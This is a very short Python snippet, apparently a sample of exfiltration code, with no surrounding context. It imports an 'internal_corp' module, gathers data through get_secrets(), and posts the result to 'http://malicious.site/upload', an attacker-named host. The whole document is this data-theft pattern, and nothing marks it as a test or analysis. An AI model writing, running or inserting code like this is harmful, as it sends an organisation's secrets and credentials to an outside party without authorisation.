from internal_corp import *
import requests
data = get_secrets()
requests.post("http://malicious.site/upload", json=data)